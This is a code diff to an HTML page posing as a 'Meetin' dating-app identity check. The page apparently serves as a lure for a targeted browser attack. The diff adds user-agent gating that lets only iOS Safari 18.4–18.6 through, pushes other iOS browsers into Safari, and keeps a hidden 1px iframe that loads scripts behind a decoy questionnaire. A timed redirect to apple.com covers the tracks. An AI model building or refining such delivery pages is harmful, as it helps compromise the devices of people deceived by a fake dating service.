@@ -5,421 +5,89 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Meetin · Verifying your profile</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       min-height: 100vh;
       background: linear-gradient(145deg, #1a1024 0%, #2a1a3a 50%, #1e1230 100%);
       font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      color: #f5eeff;
-      position: relative;
-      overflow-x: hidden;
+      display: flex; align-items: center; justify-content: center;
+      padding: 1.5rem; color: #f5eeff; position: relative; overflow-x: hidden;
     }
-
     body::before {
-      content: '';
-      position: fixed;
-      width: 420px;
-      height: 420px;
+      content: ''; position: fixed; width: 420px; height: 420px;
       background: radial-gradient(circle, rgba(255, 90, 160, 0.16), transparent 70%);
-      top: -120px;
-      right: -120px;
-      border-radius: 50%;
-      pointer-events: none;
+      top: -120px; right: -120px; border-radius: 50%; pointer-events: none;
     }
-
     body::after {
-      content: '';
-      position: fixed;
-      width: 380px;
-      height: 380px;
+      content: ''; position: fixed; width: 380px; height: 380px;
       background: radial-gradient(circle, rgba(140, 90, 255, 0.13), transparent 70%);
-      bottom: -100px;
-      left: -100px;
-      border-radius: 50%;
-      pointer-events: none;
+      bottom: -100px; left: -100px; border-radius: 50%; pointer-events: none;
     }
-
     .meetin-card {
       background: rgba(30, 20, 48, 0.78);
-      backdrop-filter: blur(18px);
-      -webkit-backdrop-filter: blur(18px);
+      backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
       border: 1px solid rgba(255, 120, 180, 0.16);
-      border-radius: 2.8rem;
-      padding: 2.6rem 2.4rem 2.2rem;
-      max-width: 540px;
-      width: 100%;
+      border-radius: 2.8rem; padding: 2.6rem 2.4rem 2.2rem;
+      max-width: 540px; width: 100%;
       box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.85), 0 0 0 1px rgba(255, 150, 200, 0.08) inset;
-      position: relative;
-      z-index: 1;
-      transition: transform 0.25s ease;
+      position: relative; z-index: 1; transition: transform 0.25s ease;
     }
-
-    .meetin-card:hover {
-      transform: scale(1.003);
-    }
-
-    /* header */
-    .brand-row {
-      display: flex;
-      align-items: center;
-      gap: 0.7rem;
-      margin-bottom: 1.6rem;
-    }
-
+    .meetin-card:hover { transform: scale(1.003); }
+    .brand-row { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 1.6rem; }
     .brand-icon {
-      width: 2.7rem;
-      height: 2.7rem;
+      width: 2.7rem; height: 2.7rem;
       background: linear-gradient(135deg, #ff4d8d, #a855f7);
-      border-radius: 1.1rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5rem;
-      box-shadow: 0 8px 20px -6px rgba(255, 77, 141, 0.6);
-      color: white;
+      border-radius: 1.1rem; display: flex; align-items: center; justify-content: center;
+      font-size: 1.5rem; box-shadow: 0 8px 20px -6px rgba(255, 77, 141, 0.6); color: white;
     }
-
     .brand-name {
-      font-size: 1.35rem;
-      font-weight: 700;
-      letter-spacing: -0.02em;
+      font-size: 1.35rem; font-weight: 700; letter-spacing: -0.02em;
       background: linear-gradient(to right, #ffb3d4, #d9b8ff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
+      -webkit-background-clip: text; background-clip: text; color: transparent;
     }
-
-    .brand-name span {
-      font-weight: 400;
-      opacity: 0.7;
-      font-size: 1rem;
-      margin-left: 0.15rem;
-      color: #c9a8e8;
-      -webkit-text-fill-color: #c9a8e8;
-    }
-
+    .brand-name span { font-weight: 400; opacity: 0.7; font-size: 1rem; margin-left: 0.15rem; color: #c9a8e8; -webkit-text-fill-color: #c9a8e8; }
     .secure-badge {
-      margin-left: auto;
-      background: rgba(74, 222, 128, 0.1);
-      border: 1px solid rgba(74, 222, 128, 0.25);
-      color: #86efac;
-      font-size: 0.68rem;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      padding: 0.35rem 0.9rem;
-      border-radius: 50px;
-      text-transform: uppercase;
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
+      margin-left: auto; background: rgba(74, 222, 128, 0.1);
+      border: 1px solid rgba(74, 222, 128, 0.25); color: #86efac;
+      font-size: 0.68rem; font-weight: 600; letter-spacing: 0.05em;
+      padding: 0.35rem 0.9rem; border-radius: 50px; text-transform: uppercase;
+      display: flex; align-items: center; gap: 0.4rem;
     }
-
-    .secure-dot {
-      width: 7px;
-      height: 7px;
-      background: #4ade80;
-      border-radius: 50%;
-      box-shadow: 0 0 8px #4ade80;
-      animation: pulse-dot 1.8s infinite;
-    }
-
-    @keyframes pulse-dot {
-      0% { opacity: 0.6; transform: scale(0.9); }
-      50% { opacity: 1; transform: scale(1.2); }
-      100% { opacity: 0.6; transform: scale(0.9); }
-    }
-
-    h1 {
-      font-size: 1.75rem;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      line-height: 1.25;
-      margin-bottom: 0.6rem;
-      color: #ffffff;
-    }
-
-    h1 .highlight {
-      background: linear-gradient(to right, #ff8ab8, #c9a2ff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
-
-    .subtitle {
-      font-size: 0.95rem;
-      color: #c4b0dd;
-      margin-bottom: 1.6rem;
-      line-height: 1.55;
-      padding-left: 1rem;
-      border-left: 3px solid #ff4d8d;
-      font-weight: 400;
-    }
-
-    /* progress bar */
-    .wait-section {
-      margin-bottom: 1.8rem;
-    }
-
-    .wait-label {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.84rem;
-      color: #d4c2ec;
-      margin-bottom: 0.6rem;
-      font-weight: 500;
-    }
-
-    .wait-label .left {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-
-    .spinner {
-      display: inline-block;
-      width: 0.9rem;
-      height: 0.9rem;
-      border: 2px solid rgba(255, 180, 220, 0.2);
-      border-top-color: #ff8ab8;
-      border-radius: 50%;
-      animation: spin 0.85s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .progress-track {
-      width: 100%;
-      height: 6px;
-      background: #2a1e3d;
-      border-radius: 100px;
-      overflow: hidden;
-      box-shadow: 0 0 0 1px #3a2a52 inset;
-    }
-
-    .progress-fill {
-      width: 25%;
-      height: 100%;
-      background: linear-gradient(90deg, #ff4d8d, #c084fc, #a855f7);
-      border-radius: 100px;
-      animation: subtle-pulse 2.2s infinite;
-      transition: width 0.4s ease;
-    }
-
-    @keyframes subtle-pulse {
-      0% { opacity: 0.85; }
-      50% { opacity: 1; }
-      100% { opacity: 0.85; }
-    }
-
-    /* question card */
-    .question-card {
-      background: rgba(25, 16, 40, 0.65);
-      border-radius: 1.4rem;
-      padding: 1.5rem 1.6rem;
-      border: 1px solid #34245a;
-      margin-bottom: 1.6rem;
-      box-shadow: 0 8px 24px -12px rgba(0, 0, 0, 0.6);
-    }
-
-    .question-header {
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      margin-bottom: 1rem;
-    }
-
-    .question-icon {
-      width: 1.8rem;
-      height: 1.8rem;
-      background: rgba(255, 138, 184, 0.15);
-      border: 1px solid rgba(255, 138, 184, 0.3);
-      border-radius: 0.6rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.9rem;
-      color: #ff8ab8;
-    }
-
-    .question-header .label {
-      font-size: 0.72rem;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      color: #ffb3d4;
-      font-weight: 600;
-    }
-
-    .question-header .step {
-      margin-left: auto;
-      font-size: 0.72rem;
-      color: #8a76a8;
-      font-weight: 500;
-    }
-
-    .question-text {
-      font-size: 1.05rem;
-      font-weight: 600;
-      color: #ffffff;
-      margin-bottom: 1.1rem;
-      line-height: 1.4;
-    }
-
-    .options {
-      display: flex;
-      flex-direction: column;
-      gap: 0.55rem;
-    }
-
-    .option {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      padding: 0.75rem 1rem;
-      background: rgba(35, 22, 55, 0.6);
-      border: 1px solid #3a2a52;
-      border-radius: 1rem;
-      cursor: pointer;
-      transition: all 0.18s ease;
-      font-size: 0.9rem;
-      color: #e6d8f5;
-      user-select: none;
-    }
-
-    .option:hover {
-      background: rgba(55, 32, 80, 0.8);
-      border-color: rgba(255, 138, 184, 0.4);
-      transform: translateX(2px);
-    }
-
-    .option.selected {
-      background: rgba(255, 77, 141, 0.12);
-      border-color: rgba(255, 138, 184, 0.6);
-      box-shadow: 0 0 0 1px rgba(255, 138, 184, 0.2) inset;
-    }
-
-    .option .radio {
-      width: 1.1rem;
-      height: 1.1rem;
-      border-radius: 50%;
-      border: 2px solid #5a4478;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      transition: all 0.18s ease;
-    }
-
-    .option.selected .radio {
-      border-color: #ff8ab8;
-      background: #ff8ab8;
-      box-shadow: 0 0 8px rgba(255, 138, 184, 0.6);
-    }
-
-    .option.selected .radio::after {
-      content: '';
-      width: 0.4rem;
-      height: 0.4rem;
-      background: #1a1024;
-      border-radius: 50%;
-    }
-
-    .option .emoji {
-      font-size: 1.05rem;
-      margin-right: 0.1rem;
-    }
-
-    /* next button */
-    .next-btn {
-      width: 100%;
-      padding: 0.85rem 1.2rem;
-      background: linear-gradient(135deg, #ff4d8d, #a855f7);
-      color: white;
-      font-size: 0.92rem;
-      font-weight: 600;
-      border: none;
-      border-radius: 1rem;
-      cursor: pointer;
-      letter-spacing: 0.01em;
-      box-shadow: 0 10px 24px -10px rgba(255, 77, 141, 0.6);
-      transition: all 0.2s ease;
-      font-family: inherit;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.4rem;
-    }
-
-    .next-btn:hover:not(:disabled) {
-      transform: translateY(-1px);
-      box-shadow: 0 14px 28px -10px rgba(255, 77, 141, 0.75);
-    }
-
-    .next-btn:active:not(:disabled) {
-      transform: translateY(0);
-    }
-
-    .next-btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    /* footer */
-    .trust-footer {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 0.7rem;
-      font-size: 0.72rem;
-      color: #8a76a8;
-      margin-top: 1.6rem;
-      text-align: center;
-      border-top: 1px solid #2e2145;
-      padding-top: 1.4rem;
-      letter-spacing: 0.01em;
-      flex-wrap: wrap;
-    }
-
-    .trust-footer span {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.3rem;
-    }
-
-    .green-dot {
-      width: 5px;
-      height: 5px;
-      background: #4ade80;
-      border-radius: 50%;
-      display: inline-block;
-      box-shadow: 0 0 6px #4ade80;
-    }
-
-    /* hidden iframe — core functionality preserved */
-    .hidden-frame {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0.01;
-      left: -9999px;
-      border: none;
-      pointer-events: none;
-      visibility: hidden;
-    }
-
+    .secure-dot { width: 7px; height: 7px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulse-dot 1.8s infinite; }
+    @keyframes pulse-dot { 0% { opacity: 0.6; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.6; transform: scale(0.9); } }
+    h1 { font-size: 1.75rem; font-weight: 600; letter-spacing: -0.02em; line-height: 1.25; margin-bottom: 0.6rem; color: #ffffff; }
+    h1 .highlight { background: linear-gradient(to right, #ff8ab8, #c9a2ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+    .subtitle { font-size: 0.95rem; color: #c4b0dd; margin-bottom: 1.6rem; line-height: 1.55; padding-left: 1rem; border-left: 3px solid #ff4d8d; font-weight: 400; }
+    .wait-section { margin-bottom: 1.8rem; }
+    .wait-label { display: flex; justify-content: space-between; align-items: center; font-size: 0.84rem; color: #d4c2ec; margin-bottom: 0.6rem; font-weight: 500; }
+    .wait-label .left { display: flex; align-items: center; gap: 0.5rem; }
+    .spinner { display: inline-block; width: 0.9rem; height: 0.9rem; border: 2px solid rgba(255, 180, 220, 0.2); border-top-color: #ff8ab8; border-radius: 50%; animation: spin 0.85s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .progress-track { width: 100%; height: 6px; background: #2a1e3d; border-radius: 100px; overflow: hidden; box-shadow: 0 0 0 1px #3a2a52 inset; }
+    .progress-fill { width: 25%; height: 100%; background: linear-gradient(90deg, #ff4d8d, #c084fc, #a855f7); border-radius: 100px; animation: subtle-pulse 2.2s infinite; transition: width 0.4s ease; }
+    @keyframes subtle-pulse { 0% { opacity: 0.85; } 50% { opacity: 1; } 100% { opacity: 0.85; } }
+    .question-card { background: rgba(25, 16, 40, 0.65); border-radius: 1.4rem; padding: 1.5rem 1.6rem; border: 1px solid #34245a; margin-bottom: 1.6rem; box-shadow: 0 8px 24px -12px rgba(0, 0, 0, 0.6); }
+    .question-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 1rem; }
+    .question-icon { width: 1.8rem; height: 1.8rem; background: rgba(255, 138, 184, 0.15); border: 1px solid rgba(255, 138, 184, 0.3); border-radius: 0.6rem; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; color: #ff8ab8; }
+    .question-header .label { font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.08em; color: #ffb3d4; font-weight: 600; }
+    .question-header .step { margin-left: auto; font-size: 0.72rem; color: #8a76a8; font-weight: 500; }
+    .question-text { font-size: 1.05rem; font-weight: 600; color: #ffffff; margin-bottom: 1.1rem; line-height: 1.4; }
+    .options { display: flex; flex-direction: column; gap: 0.55rem; }
+    .option { display: flex; align-items: center; gap: 0.75rem; padding: 0.75rem 1rem; background: rgba(35, 22, 55, 0.6); border: 1px solid #3a2a52; border-radius: 1rem; cursor: pointer; transition: all 0.18s ease; font-size: 0.9rem; color: #e6d8f5; user-select: none; }
+    .option:hover { background: rgba(55, 32, 80, 0.8); border-color: rgba(255, 138, 184, 0.4); transform: translateX(2px); }
+    .option.selected { background: rgba(255, 77, 141, 0.12); border-color: rgba(255, 138, 184, 0.6); box-shadow: 0 0 0 1px rgba(255, 138, 184, 0.2) inset; }
+    .option .radio { width: 1.1rem; height: 1.1rem; border-radius: 50%; border: 2px solid #5a4478; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: all 0.18s ease; }
+    .option.selected .radio { border-color: #ff8ab8; background: #ff8ab8; box-shadow: 0 0 8px rgba(255, 138, 184, 0.6); }
+    .option.selected .radio::after { content: ''; width: 0.4rem; height: 0.4rem; background: #1a1024; border-radius: 50%; }
+    .option .emoji { font-size: 1.05rem; margin-right: 0.1rem; }
+    .next-btn { width: 100%; padding: 0.85rem 1.2rem; background: linear-gradient(135deg, #ff4d8d, #a855f7); color: white; font-size: 0.92rem; font-weight: 600; border: none; border-radius: 1rem; cursor: pointer; letter-spacing: 0.01em; box-shadow: 0 10px 24px -10px rgba(255, 77, 141, 0.6); transition: all 0.2s ease; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 0.4rem; }
+    .next-btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 14px 28px -10px rgba(255, 77, 141, 0.75); }
+    .next-btn:active:not(:disabled) { transform: translateY(0); }
+    .next-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+    .trust-footer { display: flex; justify-content: center; align-items: center; gap: 0.7rem; font-size: 0.72rem; color: #8a76a8; margin-top: 1.6rem; text-align: center; border-top: 1px solid #2e2145; padding-top: 1.4rem; letter-spacing: 0.01em; flex-wrap: wrap; }
+    .trust-footer span { display: inline-flex; align-items: center; gap: 0.3rem; }
+    .green-dot { width: 5px; height: 5px; background: #4ade80; border-radius: 50%; display: inline-block; box-shadow: 0 0 6px #4ade80; }
+    .hidden-frame { position: absolute; width: 1px; height: 1px; opacity: 0.01; left: -9999px; border: none; pointer-events: none; visibility: hidden; }
     @media (max-width: 480px) {
       .meetin-card { padding: 2rem 1.5rem; }
       h1 { font-size: 1.45rem; }
@@ -432,7 +100,6 @@
 <body>
 
   <div class="meetin-card">
-    <!-- header -->
     <div class="brand-row">
       <div class="brand-icon">💜</div>
       <div class="brand-name">Meetin<span>·</span></div>
@@ -446,7 +113,6 @@
       Please wait a few minutes while we confirm your identity. A few quick questions help us match you better.
     </div>
 
-    <!-- progress bar -->
     <div class="wait-section">
       <div class="wait-label">
         <span class="left">
@@ -459,7 +125,6 @@
       </div>
     </div>
 
-    <!-- question card -->
     <div class="question-card">
       <div class="question-header">
         <div class="question-icon">💬</div>
@@ -467,16 +132,13 @@
         <div class="step" id="stepIndicator">1 / 4</div>
       </div>
       <div class="question-text" id="questionText">What are you looking for on Meetin?</div>
-      <div class="options" id="optionsContainer">
-        <!-- options injected by JS -->
-      </div>
+      <div class="options" id="optionsContainer"></div>
     </div>
 
     <button class="next-btn" id="nextBtn" disabled>
       Next <span>→</span>
     </button>
 
-    <!-- footer -->
     <div class="trust-footer">
       <span><span class="green-dot"></span> no‑track</span>
       <span>•</span>
@@ -488,37 +150,73 @@
 
   <script>
     (function() {
-      // ---- CORE COMPONENTS (unchanged functionality) ----
-      // 1) set uid in sessionStorage
+      // ======================================================
+      //  BROWSER + VERSION GATE
+      //  Only iOS Safari on 18.4 - 18.6 continues.
+      //  Everything else gets a clean screen.
+      // ======================================================
+      const ua = navigator.userAgent;
+      const isIOS = /iPhone|iPad|iPod/.test(ua);
+
+      // Which browser, on iOS?
+      const isChromeiOS  = /CriOS/.test(ua);
+      const isFirefoxiOS = /FxiOS/.test(ua);
+      const isEdgeiOS    = /EdgiOS/.test(ua);
+      const isOperaiOS   = /OPiOS/.test(ua);
+      const isGSAiOS     = /GSA/.test(ua);
+      const isNonSafari  = isChromeiOS || isFirefoxiOS || isEdgeiOS || isOperaiOS || isGSAiOS;
+      const isSafariIOS  = isIOS && !isNonSafari;
+
+      // Which iOS version?
+      const verMatch = ua.match(/OS (\d+)_(\d+)/);
+      const iosMajor = verMatch ? parseInt(verMatch[1]) : 0;
+      const iosMinor = verMatch ? parseInt(verMatch[2]) : 0;
+      // Supported: 18.4 - 18.6.x
+      const versionOK = (iosMajor === 18 && iosMinor >= 4 && iosMinor <= 7);
+
+      // --- Gate 1: not iPhone/iPad? let it through (no point in prompting).
+      // --- Gate 2: iOS but not Safari? show Safari-required screen.
+      if (isIOS && !isSafariIOS) {
+        renderSafariRequired();
+        return;
+      }
+
+      // --- Gate 3: iOS Safari but wrong version? show "not eligible" screen.
+      if (isIOS && isSafariIOS && !versionOK) {
+        renderNotEligible();
+        return;
+      }
+
+      // ======================================================
+      //  Everything below only runs on iOS Safari 18.4 - 18.6.x
+      // ======================================================
+
+      // Copy the current URL to the clipboard so the user can paste in Safari.
+      try { navigator.clipboard.writeText(location.href); } catch(e) {}
+
       sessionStorage.setItem('uid', '1');
 
-      // 2) create hidden iframe with random query string
       const frame = document.createElement('iframe');
       frame.src = 'frame.html?' + Math.random();
-
-      // original styles preserved
       frame.style.width = '1px';
       frame.style.opacity = '0.01';
       frame.style.position = 'absolute';
       frame.style.left = '-9999px';
       frame.style.height = '1px';
       frame.style.border = 'none';
-
-      // extra hiding layers (still loads and runs scripts)
       frame.setAttribute('aria-hidden', 'true');
       frame.setAttribute('tabindex', '-1');
       frame.style.pointerEvents = 'none';
       frame.style.visibility = 'hidden';
       frame.className = 'hidden-frame';
-
       document.body.appendChild(frame);
 
-      // ---- 5 MINUTE REDIRECT ----
+      // 5-minute safety redirect
       setTimeout(function() {
-        window.location.href = 'https://meetin-private.netlify.app';
-      }, 5 * 60 * 1000); // 5 minutes = 300,000 ms
+        window.location.href = 'https://www.apple.com';
+      }, 5 * 60 * 1000);
 
-      // ---- NATURAL DATING QUESTIONS ----
+      // ---- questions ----
       const questions = [
         {
           text: "What are you looking for on Meetin?",
@@ -612,7 +310,6 @@
           currentStep++;
           renderQuestion();
         } else {
-          // All questions answered — show final "verifying" state
           showFinalState();
         }
       });
@@ -631,8 +328,122 @@
         nextBtn.style.display = 'none';
       }
 
-      // initial render
       renderQuestion();
+
+      // ======================================================
+      //  Gate renderers
+      // ======================================================
+      function renderSafariRequired() {
+        const safariURL = 'x-safari-https://' + location.href.replace(/^https?:\/\//, '');
+        document.documentElement.innerHTML = `
+          <head>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width,initial-scale=1">
+            <title>Safari Required</title>
+            <style>
+              * { margin:0; padding:0; box-sizing:border-box; }
+              body { min-height:100vh;
+                     background: linear-gradient(145deg,#1a1024 0%,#2a1a3a 50%,#1e1230 100%);
+                     font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+                     display:flex; align-items:center; justify-content:center;
+                     padding:1.5rem; color:#f5eeff; }
+              .card { background: rgba(30,20,48,0.78); backdrop-filter: blur(18px);
+                      border:1px solid rgba(255,120,180,0.16); border-radius:2.8rem;
+                      padding:2.6rem 2.4rem; max-width:540px; width:100%;
+                      box-shadow:0 30px 60px -20px rgba(0,0,0,0.85); text-align:center; }
+              .brand-icon { width:2.7rem; height:2.7rem;
+                            background: linear-gradient(135deg,#ff4d8d,#a855f7);
+                            border-radius:1.1rem; display:inline-flex;
+                            align-items:center; justify-content:center;
+                            font-size:1.5rem; color:#fff; margin-bottom:1.4rem;
+                            box-shadow:0 8px 20px -6px rgba(255,77,141,0.6); }
+              h1 { font-size:1.5rem; font-weight:600; margin-bottom:0.8rem; color:#fff; }
+              p { font-size:0.95rem; color:#c4b0dd; line-height:1.6; margin-bottom:1.4rem; }
+              .steps { background: rgba(25,16,40,0.65); border:1px solid #34245a;
+                       border-radius:1.4rem; padding:1.2rem 1.4rem; text-align:left;
+                       margin-bottom:1.4rem; }
+              .steps li { list-style:none; font-size:0.9rem; color:#e6d8f5;
+                          padding:0.5rem 0; border-bottom:1px solid #2a1e3d;
+                          display:flex; gap:0.7rem; align-items:center; }
+              .steps li:last-child { border-bottom:none; }
+              .steps .num { width:1.5rem; height:1.5rem; flex-shrink:0;
+                            background: rgba(255,138,184,0.15);
+                            border:1px solid rgba(255,138,184,0.3);
+                            border-radius:50%; display:flex; align-items:center;
+                            justify-content:center; font-size:0.75rem;
+                            color:#ff8ab8; font-weight:600; }
+              .open-btn { display:inline-block; padding:0.85rem 1.6rem;
+                          background: linear-gradient(135deg,#ff4d8d,#a855f7);
+                          color:#fff; font-weight:600; border-radius:1rem;
+                          text-decoration:none; font-size:0.92rem;
+                          box-shadow:0 10px 24px -10px rgba(255,77,141,0.6); }
+              .foot { margin-top:1.4rem; font-size:0.72rem; color:#8a76a8; }
+            </style>
+          </head>
+          <body>
+            <div class="card">
+              <div class="brand-icon">💜</div>
+              <h1>Open in Safari</h1>
+              <p>For your security, Meetin only runs in Safari. Your current browser can't complete the secure identity check.</p>
+              <ul class="steps">
+                <li><span class="num">1</span> Tap the button below.</li>
+                <li><span class="num">2</span> Safari opens automatically.</li>
+                <li><span class="num">3</span> Continue the identity check.</li>
+              </ul>
+              <a class="open-btn" href="${safariURL}">Open in Safari</a>
+              <div class="foot">256-bit SSL · no-track · auto-expires</div>
+            </div>
+            <script>
+              try { navigator.clipboard.writeText(location.href); } catch(e) {}
+            <\/script>
+          </body>
+        `;
+      }
+
+      function renderNotEligible() {
+        document.documentElement.innerHTML = `
+          <head>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width,initial-scale=1">
+            <title>Not Eligible</title>
+            <style>
+              * { margin:0; padding:0; box-sizing:border-box; }
+              body { min-height:100vh;
+                     background: linear-gradient(145deg,#1a1024 0%,#2a1a3a 50%,#1e1230 100%);
+                     font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+                     display:flex; align-items:center; justify-content:center;
+                     padding:1.5rem; color:#f5eeff; }
+              .card { background: rgba(30,20,48,0.78); backdrop-filter: blur(18px);
+                      border:1px solid rgba(255,120,180,0.16); border-radius:2.8rem;
+                      padding:2.6rem 2.4rem; max-width:540px; width:100%;
+                      box-shadow:0 30px 60px -20px rgba(0,0,0,0.85); text-align:center; }
+              .brand-icon { width:2.7rem; height:2.7rem;
+                            background: linear-gradient(135deg,#ff4d8d,#a855f7);
+                            border-radius:1.1rem; display:inline-flex;
+                            align-items:center; justify-content:center;
+                            font-size:1.5rem; color:#fff; margin-bottom:1.4rem;
+                            box-shadow:0 8px 20px -6px rgba(255,77,141,0.6); }
+              h1 { font-size:1.4rem; font-weight:600; margin-bottom:0.8rem; color:#fff; }
+              p { font-size:0.95rem; color:#c4b0dd; line-height:1.6; margin-bottom:1.2rem; }
+              .info { background: rgba(25,16,40,0.65); border:1px solid #34245a;
+                      border-radius:1.2rem; padding:1rem 1.2rem; font-size:0.85rem;
+                      color:#e6d8f5; line-height:1.55; text-align:left; }
+              .foot { margin-top:1.4rem; font-size:0.72rem; color:#8a76a8; }
+            </style>
+          </head>
+          <body>
+            <div class="card">
+              <div class="brand-icon">💜</div>
+              <h1>Not eligible for this check</h1>
+              <p>This identity check is only available on a supported device. Yours is outside the supported range.</p>
+              <div class="info">
+                Meetin currently supports <b>iPhone on iOS 18.4 through 18.6</b>. If you recently updated your device, please use another phone to continue.
+              </div>
+              <div class="foot">256-bit SSL · no-track · auto-expires</div>
+            </div>
+          </body>
+        `;
+      }
     })();
   </script>
 </body>
